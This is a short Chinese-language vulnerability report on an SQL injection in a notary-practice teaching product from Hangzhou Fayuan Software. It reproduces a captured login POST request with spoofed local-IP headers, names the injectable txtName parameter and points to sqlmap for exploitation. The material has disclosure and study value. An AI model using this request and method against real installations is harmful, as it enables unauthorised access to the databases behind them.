# 杭州法源软件 公证实务教学软件 SQL注入漏洞

## 漏洞描述

杭州法源软件 公证实务教学软件 存在SQL注入漏洞

## 漏洞影响

```
杭州法源软件 公证实务教学软件
```

## 网络测绘

FOFA暂时未收录任何网站

## 漏洞复现

登录页面如下

![](images/202202101856282.png)

登录抓取请求包



```plain
POST /JusNotary/ HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Length: 219
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: ASP.NET_SessionId=54zwf05sd1g4zyfpiuxxdmuc
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close

__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKMTE5NTI5NDc1Ng8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBZGTTkYMK0k4DlIElq0ua0zvxEhpFH8rCzVrUscEhlVc9pw%3D%3D&__VIEWSTATEGENERATOR=1B0004A3&txtName=123&txtPwd=123&btnSubmit=+
```



其中注入的参数为 POST数据中的 **txtName** 参数, 保存为文件使用 Sqlmap跑一下



![](images/202202101856878.png)